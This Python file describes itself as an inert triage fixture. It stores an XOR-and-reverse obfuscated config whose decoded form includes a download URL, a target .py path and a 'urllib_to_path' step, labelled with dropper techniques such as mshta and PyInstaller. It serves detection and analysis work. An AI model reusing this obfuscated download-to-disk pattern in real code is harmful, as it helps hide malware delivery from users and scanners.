#!/usr/bin/env python3
# Huntress Script Triage -- inert static-analysis fixture (cpython3)
import base64
import io
import os

MATERIAL_36db0944 = "29,20,74,6,6,93,7,6,1,80,7,2,87,73,1,16,5,0,20,17,74,75,6,5,40,23,23,1,22,16,10,17,44,75,5,16,5,32,9,5,22,3,11,22,52,75,94,39,89,12,16,5,20,59,1,8,13,2,24,6,6,93,7,6,1,80,7,2,87,75,10,11,12,16,29,52,23,23,1,22,16,10,17,44,89,16,10,1,3,5,59,22,1,23,17,24,29,20,74,7,84,80,80,92,87,5,2,75,0,13,8,5,18,10,13,74,1,8,20,9,5,28,1,74,6,6,93,7,6,1,80,7,2,87,75,75,94,23,20,16,16,12,89,8,22,17,24,6,6,93,7,6,1,80,7,2,87,73,10,3,13,5,20,9,5,7,89,0,13,59,10,3,13,5,20,9,5,7,24,10,11,12,16,29,20,59,11,16,59,5,16,12,23,9,89,10,13,5,12,7,59,23,19,11,0,10,13,19,24,1,8,13,2,1,10,11,59,22,1,8,8,5,16,23,10,13,29,20,89,22,1,13,22,22,5,7,24,23,16,10,1,9,3,5,22,2,59,3,10,13,22,16,23,2,89,10,11,13,16,5,7,23,17,2,6,11,24,1,10,13,8,1,20,13,20,59,22,11,16,5,22,1,10,1,3,89,28,5,16,10,29,23,24,85,89,16,10,17,11,7,59,1,3,5,16,23,24,12,16,5,20,59,11,16,59,6,13,8,8,22,17,89,22,1,16,20,5,0,5,24,1,8,13,2,59,1,16,13,22,19,72,1,16,11,9,1,22,59,1,22,13,17,21,7,5,89,23,20,1,16,23,24,86,89,18"
CODEC_36db0944 = "decimal_csv|reverse_then_xor|64"

def load_36db0944():
    return bytes(int(item) for item in MATERIAL_36db0944.split(","))

def decode_36db0944(item1):
    return bytes(value ^ 100 for value in reversed(item1))

def recover_36db0944():
    item4 = (3, 5, 8, 13)[1:3]
    _pass = 0
    while _pass < 1:
        item2 = decode_36db0944(load_36db0944())
        _pass += 1
    item3 = item2.decode("ascii", "strict")
    return item3

def inspect_36db0944():
    view = memoryview(recover_36db0944().encode("ascii"))
    return bytes(view).decode("ascii")

def surface_36db0944():
    stream = (item for item in ("generator_pipeline", "fstring_fragments", "pyinstaller_onefile", "mshta_to_python"))
    return tuple(stream)

def obfuscation_36db0944():
    left, right = "fstrin", "g_fragments"
    return f"{left}{right}"

def plan_36db0944():
    fields = dict(item.split("=", 1) for item in inspect_36db0944().split("|"))
    analysis_surface = surface_36db0944()
    obfuscation_surface = obfuscation_36db0944()
    operation_plan = ("urllib_to_path", fields["url"], fields["file_path"])
    return operation_plan + (analysis_surface, obfuscation_surface)

if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":
    print(inspect_36db0944())
